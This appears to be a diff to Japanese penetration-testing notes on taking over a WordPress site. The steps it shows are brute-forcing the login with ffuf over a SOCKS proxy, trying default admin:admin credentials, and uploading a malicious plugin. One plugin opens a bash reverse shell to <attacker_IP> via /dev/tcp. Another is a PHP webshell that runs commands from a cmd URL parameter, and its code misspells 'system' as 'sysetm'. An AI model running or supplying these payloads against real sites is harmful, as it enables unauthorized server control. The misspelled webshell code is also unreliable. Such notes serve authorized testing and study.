@@ -113,9 +113,8 @@ ffuf -x socks5://localhost:1080 -u http://<target_IP>/login -X POST -w /usr/shar
 
 ### Exploit
 
-(a)  `/wp-admin`にアクセスし、`admin:admin`もしくは所有クレデンシャルでログイン試行
-
-(b) shell獲得のために、プラグインをアップロードする↓
+以下のエクスプロイトのために、WordPress管理画面にアクセスする必要がある。
+`/wp-admin`にアクセスし、`admin:admin` もしくは所有クレデンシャルでログイン試行する。
 
 #### Reverse Shell w/ WordPressプラグイン
 
@@ -141,7 +140,7 @@ system("bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1'");
 zip <output_name> <file>
 ```
 
-4. アップロード→Activate Pluginし、リバースシェルを獲得
+4. WordPress管理画面からプラグインをアップロード→Activate Pluginし、リバースシェルを獲得
 
 #### WebShell w/ WordPressプラグイン
 
@@ -149,7 +148,7 @@ zip <output_name> <file>
 ```php
 <?php 
 	/*
-	Plugin Name: プラグイン名]
+	Plugin Name: <プラグイン名>
 	*/
 
 echo sysetm($_GET["cmd"]); 
@@ -162,6 +161,7 @@ zip <output_name> <file>
 ```
 
 3. アップロード→Activate Plugin
+
 4. 格納先で実行
 ```
 http://[Target]/wp-content/plugins/[プラグイン名]/[ファイル名]?cmd=id
